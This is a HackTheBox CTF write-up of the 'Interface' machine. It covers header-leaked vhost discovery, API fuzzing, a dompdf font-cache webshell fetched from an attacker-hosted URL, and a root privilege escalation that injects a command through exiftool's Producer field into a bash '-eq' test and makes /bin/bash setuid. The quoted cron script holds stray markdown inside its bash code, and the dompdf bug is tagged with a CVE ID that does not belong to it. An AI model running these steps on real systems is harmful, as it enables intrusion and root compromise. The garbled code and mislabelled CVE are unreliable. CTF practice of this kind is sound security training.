---
title: "Interface"
date: 2023-08-19
type: docs
tags:
  - htb
  - linux
  - medium
  - api
  - vhost-in-headers
  - dompdf
  - cve-2021-3129
  - font-cache-poisoning
  - rce
  - exiftool
  - bash-arithmetic-injection
  - cron
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 18.04), **Difficulty:** Medium, **Released:** 2023-08-19, **IP:** `10.10.11.200` , `interface.htb`

</div>

<div class="callout callout-warning">

**Partial**

My notes cover recon, the API discovery, and the dompdf approach. The completed dompdf exploitation and the `cleancache.sh` privesc are reconstructed from published writeups (arz101, D4nt3, FluffMe) and marked.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Main site is "Site Maintenance". A response header leaks the vhost **`prd.m.rendering-api.interface.htb`**.
2. That host is a JSON API that only answers `POST`. Brute force it to find `/api/html2pdf`, then fuzz parameters to find `html`.
3. `/api/html2pdf` renders attacker HTML with **dompdf** (a version vulnerable to the font cache poisoning RCE, CVE-2021-3129 family). Host a PHP payload disguised as a font, reference it with `@font-face`, then request the predictable cached font path. Shell as `www-data`.
4. A root cron runs `/usr/local/sbin/cleancache.sh`, which reads the `Producer` PDF metadata with `exiftool` and compares it with bash `[ "$x" -eq "dompdf" ]`. The `-eq` forces **arithmetic evaluation** of the string, so a `Producer` of `a[$(command)]` runs `command` as root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| (no credentials, both steps are code execution) | |
| `user.txt` | `/home/dev/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Interface is two code execution bugs with no passwords in between. The foothold teaches **finding an API that is not linked anywhere**: the vhost only appears in a `X-...` response header, and once you have it the endpoint and its parameter both have to be brute forced with `POST`. The dompdf RCE is a well known chain (write a PHP file with a `.ttf`-ish name into the font cache via `@font-face`, then hit the cache path). The privesc is a genuinely clever bash footgun: **`[ "$string" -eq N ]` evaluates the string arithmetically**, and bash arithmetic runs `$(...)` command substitution inside array subscripts, so controlling a string that reaches `-eq` is command injection as whoever runs the script.

Related "vhost hidden in headers/JS" boxes: [Interface](/writeups/hackthebox/linux/medium/interface/) is the reference. Related dompdf / PDF rendering: [Stocker](/writeups/hackthebox/linux/easy/stocker/), [Bagel](/writeups/hackthebox/linux/medium/bagel/). Related "root cron runs a tool on attacker files": [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/) (binwalk), [Titanic](/writeups/hackthebox/linux/easy/titanic/) (ImageMagick), [Inject](/writeups/hackthebox/linux/easy/inject/) (ansible).

---

## Full Walkthrough

### Reconnaissance

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site Maintenance
```

Inspecting the site's requests in Burp reveals a subdomain referenced in a response header:

![Pasted image 20240211161654](Pasted-image-20240211161654.png)

```
prd.m.rendering-api.interface.htb
```

![Pasted image 20240211161743](Pasted-image-20240211161743.png)

Adding it to `/etc/hosts` returns a bare "file not found". It is an API.

### API enumeration

The API only answers `POST`, so brute force with `-m post`:

```bash
feroxbuster -u http://prd.m.rendering-api.interface.htb/api/ \
  -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt \
  -t 15 -x html,php,py,txt,js -k -m post
```

Finds `/api/html2pdf`. Fuzz for the JSON parameter:

```bash
ffuf -w /usr/share/SecLists/Discovery/Web-Content/raft-small-directories.txt -c \
  -X POST -d '{"FUZZ":"FUZZ"}' -H 'Content-Type: application/json' \
  -u http://prd.m.rendering-api.interface.htb/api/html2pdf -fs 0
```

```console
html   [Status: 200, ...]
```

The endpoint takes `{"html": "<markup>"}`.

![Pasted image 20240211171130](Pasted-image-20240211171130.png)

### Foothold, dompdf font cache RCE

<div class="callout callout-note">

**The dompdf RCE (CVE-2021-3129 family)**

Old dompdf with `$isRemoteEnabled = true` will fetch a font referenced by `@font-face { src: url(...) }`, and it caches the downloaded file on disk **keeping the original extension** at a predictable path like `/dompdf/lib/fonts/<family>_normal_<md5(url)>.php`. So you:
1. Host `exploit.php` (a webshell) and a `.css` that does `@font-face{ font-family:'x'; src:url('http://you/exploit.php'); }`.
2. Send `{"html":"<link rel=stylesheet href='http://you/exploit.css'>"}` to `/api/html2pdf`. dompdf downloads `exploit.php` into its font cache as `x_normal_<hash>.php`.
3. Request `http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/x_normal_<hash>.php` (compute `<hash>` = `md5("http://you/exploit.php")`). The webshell runs as `www-data`.

The [positive-security/dompdf-rce](https://github.com/positive-security/dompdf-rce) repo automates the payload files. Upgrade to a reverse shell as `www-data`, then `su dev` or read `dev`'s files for `user.txt`.

</div>

<div class="callout callout-note">

**Beyond the recorded notes, privesc via cleancache.sh**

`pspy` shows a root cron running `/usr/local/sbin/cleancache.sh` roughly once a minute:
```bash
#!/bin/bash
cache_dir="/tmp/"
for cache_file in "$cache_dir"*; do
  if [ -f "$cache_file" ]; then
    meta_producer=$(exiftool -s -s -s -Producer "$cache_file")
    if **$meta_producer == "dompdf"** || [ "$meta_producer" -eq "dompdf" ] 2>/dev/null; then
      rm "$cache_file"
    fi
  fi
done
```
The `[ "$meta_producer" -eq "dompdf" ]` branch is the bug. `test -eq` forces **arithmetic evaluation** of both operands, and bash arithmetic evaluates `$(...)` inside an array index. So set a PDF's `Producer` to `a[$(command)]` and the command runs as root when the cron processes the file.
```bash
# on the box as www-data
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /tmp/x.sh && chmod +x /tmp/x.sh
printf '%%PDF-1.4\n' > /tmp/evil.pdf         # minimal pdf so exiftool reads it
exiftool -Producer='a[$(/tmp/x.sh)]' /tmp/evil.pdf
# wait for the cron
ls -l /bin/bash        # -rwsr-xr-x
/bin/bash -p
cat /root/root.txt
```

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/dev/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **APIs leak in headers and JS.** Grep every response for `.htb`, internal hostnames, and `X-` headers before assuming there is nothing else.
- **Patch dompdf** and set `$isRemoteEnabled = false`. Rendering untrusted HTML with a library that fetches and caches remote resources is RCE.
- **Never use `[ "$x" -eq "$y" ]` on untrusted strings.** Use `**"$x" == "$y"**` for string comparison. `-eq` is arithmetic and bash arithmetic executes `$(...)`.
- **Root crons that run tools on files in world writable directories** (`/tmp`, upload dirs) are a standing privesc. Move the work to a private dir or run it as an unprivileged user.
- **`exiftool` metadata is attacker controlled.** Treat every field as hostile input.

---

## Related Writeups

- **Hidden API / vhost discovery:** [Heal](/writeups/hackthebox/linux/medium/heal/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/)
- **dompdf / PDF rendering to RCE or SSRF:** [Stocker](/writeups/hackthebox/linux/easy/stocker/), [Bagel](/writeups/hackthebox/linux/medium/bagel/)
- **Root cron processes attacker files:** [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Inject](/writeups/hackthebox/linux/easy/inject/)
- **Bash / shell injection footguns:** [Previse](/writeups/hackthebox/linux/easy/previse/), [Headless](/writeups/hackthebox/linux/medium/headless/)

## References

- positive-security dompdf RCE <https://github.com/positive-security/dompdf-rce>
- Interface writeup (arz101) <https://arz101.medium.com/hackthebox-interface-a3f249cc2624>
- Interface writeup (D4nt3) <https://andresruizzzzz.github.io/blog/htb-writeup-interface/>
- Bash test `-eq` arithmetic injection <https://linuxpip.org/bash-test-eq-string/>
